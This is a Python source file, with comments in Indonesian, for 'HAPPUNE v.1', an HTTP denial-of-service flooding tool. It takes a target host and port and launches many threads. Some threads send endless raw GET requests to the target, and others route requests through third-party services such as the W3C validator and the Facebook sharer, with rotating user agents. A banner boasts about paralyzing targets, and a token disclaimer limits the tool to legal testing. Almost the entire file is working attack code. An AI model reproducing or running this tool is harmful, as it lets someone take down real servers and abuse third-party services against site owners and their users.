#!/usr/bin/python3
# -*- coding: utf-8 -*-

# HAPPUNE v.1
# High-speed Attack Persistent Packet Utility for Network Evasion
# By yallism — Gunakan hanya untuk pengujian legal!

from queue import Queue
from optparse import OptionParser
import time, sys, socket, threading, logging, urllib.request, random
import os
import platform
from colorama import Fore, Style, init
import shutil  # Untuk cek mpv

init(autoreset=True)

def banner():
    os.system('clear' if platform.system() != 'Windows' else 'cls')
    print(Fore.RED + Style.BRIGHT + r"""

    _  _   _   ___ ___ _   _ _  _ ___
   | || | /_\ | _ \ _ \ | | | \| | __|
   | __ |/ _ \|  _/  _/ |_| | .` | _|
   |_||_/_/ \_\_| |_|  \___/|_|\_|___|


    """ + Fore.YELLOW + "High-speed Attack Persistent Packet Utility for Network Evasion")
    print(Fore.GREEN +  "    Author    : yallism")
    print(Fore.GREEN +  "    Instagram : @ilannisme")
    print(Fore.RED +    "    Lepaskan, Lumpuhkan, Hilangkan.")
    print(Fore.GREEN + "-" * 70)

def putar_musik(link):
    if shutil.which("mpv") is None:
        print(Fore.RED + "   [!] mpv tidak ditemukan! Install dengan: pkg install mpv")
        return
    print(Fore.YELLOW + "    [♫] Mode gacor nih bang?")
    os.system(f"mpv '{link}' --no-video > /dev/null 2>&1 &")

def user_agent():
    global uagent
    uagent = [
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
        "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
        "Mozilla/5.0 (X11; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 Chrome/16.0.912.63 Safari/535.7",
        "Mozilla/5.0 (Windows NT 6.1; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
    ]
    return uagent

def my_bots():
    global bots
    bots = [
        "http://validator.w3.org/check?uri=",
        "http://www.facebook.com/sharer/sharer.php?u="
    ]
    return bots

def bot_hammering(url):
    try:
        while True:
            urllib.request.urlopen(
                urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)})
            )
            print(Fore.MAGENTA + "[BOT] Menyerang melalui third-party...")
            time.sleep(0.1)
    except:
        time.sleep(0.1)

def down_it(item):
    try:
        while True:
            packet = str(f"GET / HTTP/1.1\nHost: {host}\n\nUser-Agent: {random.choice(uagent)}\n{data}").encode('utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            if s.sendto(packet, (host, port)):
                s.shutdown(1)
                print(Fore.GREEN + time.ctime() + Fore.BLUE + " <-- Packet terkirim!")
            else:
                s.shutdown(1)
                print(Fore.RED + "Shutdown")
            time.sleep(0.1)
    except socket.error:
        print(Fore.RED + "[!] Tidak terhubung! Server mungkin sudah mati.")
        time.sleep(0.1)

def dos():
    while True:
        item = q.get()
        down_it(item)
        q.task_done()

def dos2():
    while True:
        item = w.get()
        bot_hammering(random.choice(bots) + "http://" + host)
        w.task_done()

def usage():
    print(Fore.YELLOW + '''
    Penggunaan: python3 happune.py -s [server] -p [port] -t [threads]

    -h / --help       : Tampilkan bantuan
    -s / --server     : IP/Domain target
    -p / --port       : Port target (default: 80)
    -t / --turbo      : Jumlah thread simultan (default: 135)

    "Bukan exploit yang membobolku, Tapi janji palsumu."
''')
    sys.exit()

def get_parameters():
    global host, port, thr
    optp = OptionParser(add_help_option=False)
    optp.add_option("-q", "--quiet", action="store_const", dest="loglevel",
                    const=logging.ERROR, default=logging.INFO)
    optp.add_option("-s", "--server", dest="host", help="Target IP atau domain")
    optp.add_option("-p", "--port", type="int", dest="port", help="Port target (default: 80)")
    optp.add_option("-t", "--turbo", type="int", dest="turbo", help="Jumlah thread (default: 135)")
    optp.add_option("-h", "--help", dest="help", action='store_true', help="Tampilkan bantuan")

    opts, _ = optp.parse_args()
    logging.basicConfig(level=opts.loglevel, format='%(levelname)-8s %(message)s')

    if opts.help:
        usage()
    if opts.host:
        host = opts.host
    else:
        usage()
    port = opts.port if opts.port else 80
    thr = opts.turbo if opts.turbo else 135

# Baca headers.txt atau gunakan default
global data
try:
    with open("headers.txt", "r") as headers:
        data = headers.read()
except FileNotFoundError:
    data = "User-Agent: Mozilla/5.0\nAccept: */*\n"

# Antrian
q = Queue()
w = Queue()

if __name__ == '__main__':
    banner()
    putar_musik("https://k.top4top.io/m_3464qix6b0.mp3")

    if len(sys.argv) < 2:
        usage()

    get_parameters()
    print(Fore.YELLOW + f"Target: {host} | Port: {port} | Threads: {thr}")
    print(Fore.CYAN + "Menyiapkan serangan, mohon tunggu...")
    user_agent()
    my_bots()
    time.sleep(5)

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.settimeout(1)
    except socket.error:
        print(Fore.RED + "[!] Gagal koneksi! Cek kembali IP dan port target.")
        usage()

    for _ in range(thr):
        threading.Thread(target=dos, daemon=True).start()
        threading.Thread(target=dos2, daemon=True).start()

    item = 0
    while True:
        if item > 1800:
            item = 0
            time.sleep(0.1)
        item += 1
        q.put(item)
        w.put(item)

    q.join()
    w.join()
